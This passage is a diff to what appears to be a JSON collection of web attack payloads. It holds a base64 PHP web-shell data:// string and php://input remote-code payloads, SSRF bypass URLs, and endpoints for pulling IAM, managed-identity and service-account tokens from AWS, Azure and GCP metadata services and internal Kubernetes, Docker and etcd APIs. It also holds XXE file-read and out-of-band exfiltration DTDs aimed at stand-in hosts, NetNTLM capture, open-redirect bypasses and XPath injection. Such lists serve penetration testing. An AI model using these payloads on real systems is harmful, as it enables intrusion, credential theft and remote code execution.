       {"value": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "note": "data:// base64 RCE"},
       {"value": "php://input", "note": "RCE: send <?php system('id');?> in POST body"},
@@ -248,7 +460,7 @@
     ]
   },
   {
-    "name": "SSRF",
+    "name": "SSRF - basics & bypass",
     "payloads": [
       {"value": "http://127.0.0.1/", "note": "Loopback"},
       {"value": "http://localhost/", "note": "Hostname loopback"},
@@ -261,36 +473,84 @@
       {"value": "http://0177.0.0.1/", "note": "Octal IP for 127.0.0.1"},
       {"value": "http://127.0.0.1@evil.com/", "note": "Userinfo confusion"},
       {"value": "http://evil.com#@127.0.0.1/", "note": "Fragment confusion"},
-      {"value": "file:///etc/passwd", "note": "Local file read via SSRF"},
+      {"value": "http://127.0.0.1.nip.io/", "note": "DNS wildcard to loopback"},
+      {"value": "http://spoofed.OOB/", "note": "Confirm SSRF via out-of-band"},
+      {"value": "file:///etc/passwd", "note": "Local file read"},
       {"value": "dict://127.0.0.1:6379/info", "note": "dict:// to internal Redis"},
-      {"value": "gopher://127.0.0.1:6379/_%2A1%0D%0A", "note": "gopher:// to craft internal requests"},
-      {"value": "http://spoofed.OOB/", "note": "Confirm SSRF via out-of-band"}
+      {"value": "gopher://127.0.0.1:6379/_%2A1%0D%0A", "note": "gopher:// to craft internal requests"}
     ]
   },
   {
-    "name": "SSRF - cloud metadata",
+    "name": "SSRF - AWS metadata",
     "payloads": [
-      {"value": "http://169.254.169.254/latest/meta-data/", "note": "AWS metadata root"},
-      {"value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "note": "AWS IAM role names"},
-      {"value": "http://169.254.169.254/latest/user-data/", "note": "AWS user-data (often secrets)"},
-      {"value": "http://169.254.169.254/latest/api/token", "note": "AWS IMDSv2 token (PUT, header X-aws-ec2-metadata-token-ttl-seconds)"},
-      {"value": "http://metadata.google.internal/computeMetadata/v1/", "note": "GCP metadata (needs header Metadata-Flavor: Google)"},
-      {"value": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "note": "GCP service-account token"},
-      {"value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "note": "Azure metadata (needs header Metadata: true)"},
-      {"value": "http://169.254.169.254/metadata/v1/", "note": "DigitalOcean metadata"},
-      {"value": "http://100.100.100.200/latest/meta-data/", "note": "Alibaba Cloud metadata"}
+      {"value": "http://169.254.169.254/latest/meta-data/", "note": "Metadata root (IMDSv1)"},
+      {"value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "note": "IAM role name"},
+      {"value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE", "note": "Temp IAM credentials"},
+      {"value": "http://169.254.169.254/latest/user-data/", "note": "User-data (often secrets)"},
+      {"value": "http://169.254.169.254/latest/dynamic/instance-identity/document", "note": "Instance identity (account id, region)"},
+      {"value": "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key", "note": "SSH public key"},
+      {"value": "http://169.254.169.254/latest/api/token", "note": "IMDSv2 token: PUT + header X-aws-ec2-metadata-token-ttl-seconds: 21600"},
+      {"value": "http://169.254.170.2/v2/credentials/", "note": "ECS task IAM credentials"},
+      {"value": "http://169.254.169.254/latest/meta-data/", "note": "Bypass: try http://[::ffff:169.254.169.254]/ or 2852039166 (decimal)"}
     ]
   },
   {
-    "name": "XXE",
+    "name": "SSRF - Azure metadata",
+    "payloads": [
+      {"value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "note": "Instance metadata (header Metadata: true)"},
+      {"value": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "note": "Compute details (header Metadata: true)"},
+      {"value": "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01", "note": "Network config"},
+      {"value": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "note": "Managed-identity token for ARM (header Metadata: true)"},
+      {"value": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net", "note": "Managed-identity token for Key Vault"},
+      {"value": "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text", "note": "User data"}
+    ]
+  },
+  {
+    "name": "SSRF - GCP metadata",
+    "payloads": [
+      {"value": "http://metadata.google.internal/computeMetadata/v1/", "note": "Metadata root (header Metadata-Flavor: Google)"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "note": "Service-account OAuth token"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", "note": "Service-account email"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "note": "Project id"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "note": "Instance attributes (startup scripts, ssh keys)"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json", "note": "Recursive dump (header Metadata-Flavor: Google)"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token", "note": "v1beta1 (no header required on old setups)"}
+    ]
+  },
+  {
+    "name": "SSRF - other cloud & internal",
+    "payloads": [
+      {"value": "http://169.254.169.254/metadata/v1/", "note": "DigitalOcean metadata"},
+      {"value": "http://100.100.100.200/latest/meta-data/", "note": "Alibaba Cloud metadata"},
+      {"value": "http://169.254.169.254/opc/v1/instance/", "note": "Oracle Cloud metadata"},
+      {"value": "http://169.254.169.254/openstack/latest/meta_data.json", "note": "OpenStack metadata"},
+      {"value": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", "note": "Kubernetes API (with mounted SA token)"},
+      {"value": "http://127.0.0.1:2375/containers/json", "note": "Docker daemon socket over TCP"},
+      {"value": "http://127.0.0.1:8500/v1/kv/?recurse", "note": "Consul KV store"},
+      {"value": "http://127.0.0.1:2379/v2/keys/?recursive=true", "note": "etcd keys"},
+      {"value": "http://127.0.0.1:9200/_search", "note": "Elasticsearch"},
+      {"value": "http://127.0.0.1:6379/", "note": "Redis (try gopher for real commands)"}
+    ]
+  },
+  {
+    "name": "XXE - Linux",
     "payloads": [
       {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", "note": "Classic file read"},
       {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://OOB/\">]><r>&x;</r>", "note": "Out-of-band / blind"},
       {"value": "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://OOB/e.dtd\">%p;]>", "note": "External parameter entity (blind exfil)"},
       {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", "note": "PHP filter to read non-XML files"},
       {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>", "note": "RCE via expect:// (if enabled)"},
+      {"value": "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///proc/self/environ\">]><r>&x;</r>", "note": "Read process environment"}
+    ]
+  },
+  {
+    "name": "XXE - Windows & advanced",
+    "payloads": [
+      {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>", "note": "Windows file read"},
+      {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"\\\\OOB\\share\">]><r>&x;</r>", "note": "UNC path → NetNTLM capture"},
       {"value": "<svg xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></svg>", "note": "XInclude inside SVG upload"},
-      {"value": "<!DOCTYPE r [<!ENTITY a \"aaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;\">]><r>&b;</r>", "note": "Billion-laughs style DoS (keep small in tests)"}
+      {"value": "<!DOCTYPE r [<!ENTITY a \"aaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;\">]><r>&b;</r>", "note": "Billion-laughs style DoS (keep small in tests)"},
+      {"value": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE r [<!ENTITY % d SYSTEM \"file:///etc/passwd\"><!ENTITY % e \"<!ENTITY &#x25; x SYSTEM 'http://OOB/?%d;'>\">%e;%x;]>", "note": "Error/OOB exfiltration DTD"}
     ]
   },
   {
@@ -308,7 +568,8 @@
       {"value": "http://evil.com\\.legit.com", "note": "Backslash host confusion"},
       {"value": "//evil%E3%80%82com", "note": "Ideographic full stop as dot"},
       {"value": "/%09/evil.com", "note": "Tab prefix"},
-      {"value": "/%2f%2fevil.com", "note": "Encoded double slash"}
+      {"value": "/%2f%2fevil.com", "note": "Encoded double slash"},
+      {"value": "https://legit.com.evil.com", "note": "Domain suffix confusion"}
     ]
   },
   {
@@ -399,7 +660,8 @@
       {"value": "x' or name()='username' or 'x'='y", "note": "Node-name probe"},
       {"value": "']|//user/*|//['", "note": "Return all user nodes"},
       {"value": "count(/*)", "note": "Count root children"},
-      {"value": "' or position()=1 or '", "note": "Positional bypass"}
+      {"value": "' or position()=1 or '", "note": "Positional bypass"},
+      {"value": "' or substring(//user[1]/password,1,1)='a", "note": "Blind char extraction"}
     ]
   },
   {
